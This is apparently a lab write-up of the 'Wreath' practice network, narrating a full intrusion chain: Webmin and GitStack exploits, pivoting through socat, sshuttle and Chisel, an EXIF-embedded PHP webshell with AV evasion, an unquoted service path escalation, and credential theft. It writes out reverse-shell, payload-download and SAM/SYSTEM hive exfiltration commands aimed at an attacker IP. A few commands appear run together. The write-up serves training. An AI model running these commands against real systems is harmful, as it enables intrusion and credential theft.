
# Attack Narrative 




## Initial Enumeration



We began the exercise with the client providing us the IP of the public-facing server. From here we begin our enumeration.

**Initial IP: 10.200.85.200** 

Do either rustscan or nmap scan of the target: 


`nmap -p-15000 -vv 10.200.85.200 -oG initial-scan` 
`rustscan -a 10.200.85.200 --range 1-15000` 

(==**As shown in [Appendix](Appendix.md#exhibit-a)(Exhibit A)**==)
`rustscan -u 5000 -b 1900 -t 4000 --tries 2 --scan-order serial -a 10.200.85.200 -- -A -sVC --script=safe,default,discovery,version,vuln | sudo tee rustscan-full-result-10.200.85.200  


We got to the website at 10.200.85.200 and see this is Thomas Wreath's personal site.

We found one of the ports had the following application open. In the context of the lab, this seems like the service we can look at:
Miniserve is a small, self-contained cross-platform CLI tool that allows you to serve some file(s) via HTTP. It supports authentication, TLS, folder download, file upload, directory creation, themes, and more.):

`10000/tcp open  http     syn-ack MiniServ 1.890 (Webmin httpd)`


We search for a CVE for this service: CVE-2019-15107 download exploit for it.

![Wreath-searchsploit_webmin](Wreath-searchsploit_webmin.png)





## Shell to the Webserver



We run the script for the CVE and gain reverse shell. (We can stabilise this shell.)

![Wreath-initial-revshell](Wreath-initial-revshell.png)


Retrieve shadow file and ssh keys:

`[root@prod-serv ] cat /etc/shadow`

![Wreath-rsa-file](Wreath-rsa-file.png)


ssh -i Wreathhost1_id_rsa root@10.200.85.200


Since we now had SSH access as root to the web-server, and it will be used as a pivot to get to the internal network, we uploaded (via an https web-server from our attack machine) netcat to the web-server to discover other hosts and socat for use in proxying later on.


First on the network:

`[root@prod-serv tmp] ./nmap-mine -sn 10.200.85.0/24 -oN scan-MINE`


Then on each found host:

`[root@prod-serv tmp] ./nmap-mine -T4 -p- --open 10.200.85.100`

`[root@prod-serv tmp] ./nmap-mine -T4 -p- --open 10.200.85.150`





## Pivoting



We now use `sshuttle` to set up a proxy into the internal network:  

![Wreath-sshuttle](Wreath-sshuttle.png)  


Once we are connected, we are now able to access the IP `10.200.85.150` via our browser. - Upon reaching this page, we see the service being run is Gitstack:  

![Wreath-gitserver-page](Wreath-gitserver-page.png) 


We navigated to the `/gitstack` directory, which takes us to a login page. We tried the default username and password but had no luck. The source code of the page has no obvious vulnerabilities.  

![Wreath-gitserver-login](Wreath-gitserver-login.png) 


Knowing the service being used is Gitstack, we use `Searchsploit` to see if any exploits exist. We find an RCE exploit, copy the script to our attack machine, modify it (**==as shown in [Appendix](Appendix.md#exhibit-b)(Exhibit B)==**), and execute it.

![Wreath-searchsploit_gitstack](Wreath-searchsploit_gitstack.png)  


Executing the script, we get RCE:

![Wreath-gitserver-rce](Wreath-gitserver-rce.png)  


Alternatively, we can execute a command via `curl` (in the meantime checking system info): 

![Wreath-gitserver-info](Wreath-gitserver-info.png)  


Before we get a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world. To start up a TCPDump listener, we would use the following command:   

`bash tcpdump -i tun0 icmp`

We see that there is no connection, so we will have to set up a relay.

![Connection Test](Wreath-gitserver-conn-test.png)


We will now set up a relay on `.200` to forward a shell back to a listener on our attack machine. But first, we have to check Firewall settings on the first compromised host (`10.200.x.200`), and open a port for our proxy.

sudo systemctl status firewalld 
sudo firewall-cmd --get-active-zones 
sudo firewall-cmd --zone=public --list-all 
firewall-cmd --zone=public --add-port 23456/tcp`


![Opening Port on Webserver](Wreath-webserver-openport.png)



Now we do a 4-step process:

1. On Kali, start the `nc` listener:

![Wreath-netcat-listener](Wreath-netcat-listener.png)


2. On the `.200` host (Public-facing Web-server), start the `socat` relay:

![Wreath-socat-webserver](Wreath-socat-webserver.png)


3. URL encode our PowerShell reverse shell command using [this tool](https://www.urlencoder.org/).

4. On Kali, we use `curl` to  use the powershell (==**as shown in [Appendix](Appendix.md#exhibit-c)(Exhibit C)**==)command for the reverse shell, which gives us a shell on our `nc` listener.

![Wreath-powershell-command-to-gitserver](Wreath-powershell-command-to-gitserver.png)



We now have a reverse shell on our netcat listener:

![Wreath-netcat-gitserver-response](Wreath-netcat-gitserver-response.png)

---

### Summary Explanation of What's Happened Here:

- Earlier, we uploaded an exploit to the git-serv host.
- We have `netcat` open on our attack machine, listening.
- We have `socat` acting as a relay on the compromised server.
- We run the `socat` command on the compromised server, which opens a port on the compromised server (to await connection from the git-serv host).
- We then run a `curl` command that contains a command to have the reverse shell connect back to the compromised server, where `socat` relays it back to the `netcat` listener on our Kali machine.





## Stabilisation and Post Exploitation (Gitserver)



At this stage, since we are system users, we can optionally create an additional user and use it to RDP into `x.150` (we know RDP port `3389` or a stable CLI shell using WinRM (port `5985`) are open).


We create an Admin user: 

![Wreath-gitserver-createuser](Wreath-gitserver-createuser.png) 


We can now either log in via RDP, WinRM, or xfreerdp. We login via xfreerdp as it has an option that provides an instant share with any directory we want on our Kali, so we can use the tools available without needing to transfer them all the time. 

![Wreath-xfreerdp-gitserver](Wreath-xfreerdp-gitserver.png)


Next, we use `mimikatz` to dump the hashes: 

![Wreath-mimikatz-gitserver-dump](Wreath-mimikatz-gitserver-dump.png) 


In the event of a network reset causing us to lose the created user, we can use the obtained admin hash with `evil-WinRM`. We also find a hash for Thomas's username, and we use CrackStation to attempt to crack the hash (if it's a simple one, otherwise we would use something like hashcat). In this case, we are able to obtain a cracked plaintext password.

![Wreath-Thomas-gitserver-passhash-crackstation](Wreath-Thomas-gitserver-passhash-crackstation.png) 





## Enumerating the PC



We can either upload a tool like `netcat` to the compromised Gitserver (`.150`) using `evil-WinRM`:

![Wreath-upload-nc-gitserver](Wreath-upload-nc-gitserver.png)


Or we can also use local scripts. First, since I'm running Empire within Docker, I copy the required directory to my host Kali:

![Wreath-docker-empire-tools](Wreath-docker-empire-tools.png) 


Now we have access to these scripts:

![Wreath-docker-empire-availabe-tools](Wreath-docker-empire-availabe-tools.png) 


Then, login via `evil-WinRM` using the path of this directory and run the script. This port scan is similar to using `nmap` and gives us the following details:

![Wreath-PC-portscan](Wreath-PC-portscan.png) 





## Pivoting to the PC



Before accessing the website on the personal PC, a forward proxy needs to be established using Chisel. To view the webpage from our Kali, a second port forward will need to be set up. `sshuttle` was employed to connect to the victim's network through the externally accessible web server. Chisel was uploaded to the Git server, enabling a connection between our Kali and the host at `10.200.85.100`, with port `17000` being opened on the host at `10.200.85.150`. 

Upload the Windows version of Chisel to the Git server and rename the file to executable. When using this option, you will need to open a port in the Windows firewall to allow the forward connection to be made. 

![Wreath-upload-chisel-to-gitserver](Wreath-upload-chisel-to-gitserver.png)


Start a listener on our Kali and a Chisel server on the Gitserver. We can see the listener receives a connection back: 

![Wreath-Chisel-server-client](Wreath-Chisel-server-client.png) 


Now we need to go to Firefox and create a proxy. Once the proxy is set, visit the IP of the PC at `10.200.85.100`, and we get to the website. 

![Wreath-foxy-proxy-chisel](Wreath-foxy-proxy-chisel.png)





## Exploring Gitserver 



While exploring the website at `10.200.85.100`, it initially seemed identical to the main webserver’s version. However, using the Wappalyzer extension, we identified that this version also included PHP on the backend and used basic authentication, suggesting it might be an updated iteration. To investigate further, we located the website's Git repository at `C:\gitstack\repositories\website.git` on the Git Stack server. 

We downloaded the repository using `evil-winrm` and reconstructed the source code with GitTools Extractor. Analyzing the latest commit (ID: `345ac8b236064b431fa43f53d91c98c4834ef8f3`), we found an interesting to-do comment in the `resources/index.php` file, which could potentially reveal exploitable features.


 **EXPLANATORY INFORMATION**  

Git repositories always contain a special directory called `.git` which contains all of the meta-information for the repository. This directory can be used to fully recreate a readable copy of the repository, including things like version control and branches. If the repository is local, then this directory would be a part of the full repository—the rest of which would be the items of the repository in a human-readable format; however, as the `.git` directory is enough to recreate the repository in its entirety, the server doesn't need to store the easily readable versions of the files. This means that what we've downloaded isn't actually the full repository, so much as the building blocks we can use to recreate the repo (which is exactly what happens when using `git clone` to create a local copy of a repo!).  



Looking around the Gitserver, we find the following directory and download the `Website.git` file.

![Wreath-download-website_git-file](Wreath-download-website_git-file.png)  


On our Kali machine, we create a new directory and move the download there. We then convert the download into a `.git` directory: 

![Wreath-convert-git](Wreath-convert-git.png)  


Download GitTools and use Extractor to obtain a readable format of the repository. This creates new directories:  

git clone https://github.com/internetwache/GitTools./GitTools/Extractor/extractor.sh . website`


![Wreath-git-directories](Wreath-git-directories.png)


Each of these corresponds to a commit, but they are not sorted by date. We have to piece together the order of the commits. Fortunately, there are only three commits in this repository, and each commit comes with a `commit-meta.txt` file which we can use to get an idea of the order. To see these commits, we use a special command (but could also cat each one individually):

![Wreath-git-commit-order](Wreath-git-commit-order.png)


Finding the commit order (look for commit with no parent for the start):

- `70dde80cc19ec76704567996738894828f4ee895` (oldest)
- `82dfc97bec0d7582d485d9031c09abcb5c6b18f2`
- `345ac8b236064b431fa43f53d91c98c4834ef8f3` (latest)


Going into the latest directory, we need to look for some PHP files. Initially, we see the available subdirectories, but we can search manually for any PHP files in subdirectories:

![Wreath-git-subdirectories](Wreath-git-subdirectories.png)


Reviewing the code, we can see it's likely an upload page, and there are filters for extension type, file type to be confirmed as an image, and a mention of basic auth. Basically, the filter is set in such a way as to split the string and check only the second part, e.g.: `image.jpeg` (so here only checks for `jpeg` part). However, if you were to do `image.jpeg.php`, it would allow this as it's still only checking the second part of the string (after the split by `.`). We can see that the file will get moved into an `uploads/` directory with its original name, assuming it passed the two filters.

![Wreath-gitRepo-phpCode](Wreath-gitRepo-phpCode.png)


In our browser, we go to the `/resources` directory, and this brings up a login page. We try the credentials we found earlier on the Gitserver (Thomas's password) and they work.

![Wreath-PC-web-loginpage](Wreath-PC-web-loginpage.png)


We first attempt to upload a legit image file to see if it works. The file can be accessed via: `http://10.200.85.100/resources/uploads/test.jpg`

![Wreath-PC-upload-test](Wreath-PC-upload-test.png)

### Bypassing the Filters

1. First filter is easy as mentioned, we change the name to: `test.jpg.php`
2. For `getimagesize`, we need to upload a genuine image file which contains a PHP webshell somewhere. If this file has a `.php` file extension, then it will be executed by the website as a PHP file, meaning all we need to do is force a webshell into the file.

The easiest place to stick the shell is in the EXIF data for the image—specifically in the Comment field. We will take a legitimate image and run it through Exiftool. Exiftool also allows us to edit this information.

![Wreath-exiftool-testing](Wreath-exiftool-testing.png)


We know there is an AV on the PC, so we will need to obfuscate the payload before uploading. First, we test (proof of concept). We'll be using the following PHP payload for this:

`<?php echo "<pre>Test Payload</pre>"; die();?>`


To add this to our image, we use Exiftool:

`exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-verylegit.jpeg.php`


This adds the payload to the comment section of the image file metadata:

![Wreath-exiftool-testing-update](Wreath-exiftool-testing-update.png)


As the proof of concept works, we will upload this altered image and go to: `http://10.200.85.100/resources/uploads/test-verylegit.jpg.php`, where we will see our test image.





## AV Evasion



From the backstory, we assume the PC is just using Windows Defender.

We have the starting payload:

![Wreath-initial-php-payload-forPC](Wreath-initial-php-payload-forPC.png)


We then use the following tool to obfuscate it (choosing all options):  
    [https://www.gaijin.at/en/tools/php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator)

*We must then escape the dollar sign. So the final code is below. We then input this code into the image using Exiftool as before (renaming the file also):


![Wreath-final-phpCode-PC](Wreath-final-phpCode-PC.png)


![Wreath-updated-image-php-for-PC](Wreath-updated-image-php-for-PC.png)


Upload this shell to uploads, and verify:

`http://10.200.85.100/resources/uploads/shell-verylegit.jpg.php`

![Wreath-verify-php-shell-upload-to-PC](Wreath-verify-php-shell-upload-to-PC.png)
Now, as previously in PHP webshells, we can get RCE by typing commands into the URL. But in this case, we have replaced `cmd` with `wreath`.

![Wreath-RCE-on-PC](Wreath-RCE-on-PC.png)





### **Compiling Netcat and Reverse Shell**



We have several options to proceed with:

- **Powershell** is very obvious (heavily monitored by AMSI).
- **PHP reverse shell** is not good in this case as it can be flagged by Defender.
- **MSFVenom** is well known to AVs.
- **Veil** is good for generating AV-evading payloads, but this is an automated method, which we will leave for now.
- **Uploading NC** is an easy option*

*Since Netcat for Windows that comes with Kali is known to Defender, we must compile our own.


First, we clone the GitHub repo:

`git clone https://github.com/int0x33/nc.exe/`


Inside the `nc.exe` repository we downloaded, we need to either delete or move the two pre-compiled Netcat binaries. The repository provides a `Makefile` which we will use to compile the binary. The first two lines in the `Makefile` specify which compiler to use. We edit the `Makefile` by commenting out the first line and adding the last (as per image).

![[Wreath-nc-Makefile-change.png]]


Compile the binary by running: `make 2>/dev/null`

![[Wreath-verify-nc-custom-compile.png]]


Now we need to transfer this binary to the target (.100). We will use a simple HTTP server again.

From the URL where we have our RCE, upload the custom binary:

`curl http://10.50.86.170/nc-custom.exe -o c:\\windows\\temp\\nc-custom.exe`


Then we start Netcat (port 11111) on Kali and execute the following command on the webshell we have. In order for this to work, we had to wrap the Netcat command inside a PowerShell process to keep it from exiting early.:

powershell.exe c:\\windows\\temp\\nc-custom.exe10.50.86.170 11111 -e cmd.exe  (and URL encode it).

![[Wreath-running-RCE-command-onPC.png]]

![[Wreath-PC-shell-confirmation.png]]


At this stage, we have a low-privilege account and need to enumerate to escalate privilege. We start by looking for non-default services:

![[Wreath-PC-non-default-services.png]]


The lack of quotation marks around this service path indicates that it might be vulnerable to an "UNQUOTED SERVICE PATH" attack. When any of the directories in that path contain spaces and are writable, then, assuming the service is running as the `NT AUTHORITY\SYSTEM` account, we might be able to elevate privileges.

(Unquoted Service Path Attack has similarities to how DLL Hijacking works.)


We check to see which account the service runs under and also check the permissions on the directory to see if we can write to it:

![[Wreath-PC-enumeration.png]]


Optionally, to get more detail we can download an obfuscated copy of `winpeas.exe` from: [https://github.com/peass-ng/PEASS-ng/releases/tag/20240901-df0685e9](https://github.com/peass-ng/PEASS-ng/releases/tag/20240901-df0685e9)

Transfer to the target and run to see other potential vulnerabilities. Once we run WinPeas, we can see that many other vulnerabilities are present that may be exploited (but this is out of scope for this report).





### **Privilege Escalation**



To elevate the attacker's privileges, a small malicious .NET executable was created to start Netcat and establish a reverse shell on port 11111. This "wrapper" program was placed in the `C:\Program Files (x86)\System Explorer` directory under the name `System.exe`. By exploiting an unquoted service path vulnerability, the executable is run instead of the intended service when the service is restarted, allowing us to gain system-level access.

1. Create a file called `Wrapper.cs` with the following code:
    
    ![[Wreath-PC-wrapper.png]]
    
2. Compile our program using the Mono mcs compiler:
    
    `mcs Wrapper.cs`
    
    Send this file to the target machine and execute. Start Netcat on Kali and we will find that we get a shell:
    
    ![[Wreath-reverse-shell-onPC.png]]



Let's take a look at the actual path of our vulnerable service. There are technically three places we could add our program here. Let's put it in:

C:\Program Files (x86)\System Explorer\ and call it `System.exe`. Copy the file to the vulnerable path directory:

![[Wreath-copy-systemfile-for-path-attack.png]]


Start a listener on Kali, then try to stop and restart the service:

![[Wreath-unquoted-service-path-attack.png]]

*Notice how the service (1053) failed to start because we essentially 'hijacked' its spot.*





### **Exfiltration**



Local user hashes are stored in the Windows Registry whilst the computer is running — specifically in the `HKEY_LOCAL_MACHINE\SAM` hive. This can also be found as a file at `C:\Windows\System32\Config\SAM`, however, this should not be readable whilst the computer is running. To dump the hashes locally, we first need to save the SAM hive:

`reg.exe save HKLM\SAM sam.bak`
`dir "C:\Windows\system32\sam.bak"`

Dumping the SAM hive isn't quite enough though — we also need the SYSTEM hive which contains the boot key for the machine:

`reg.exe save HKLM\SYSTEM system.bak`


**Setup SMB Server to Exfiltrate Files**

**On Kali:**

`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username verylegit -password s3cureP@ssword1`


**On Victim PC:**

`net use \\10.50.86.170\share /USER:verylegit s3cureP@ssword1 move sam.bak \\10.50.86.170\share\sam.bak move system.bak \\10.50.86.170\share\system.bak`


Now that the files are on our Kali machine, we can dump the hashes:

![[Wreath-finalPC-hashdump.png]]

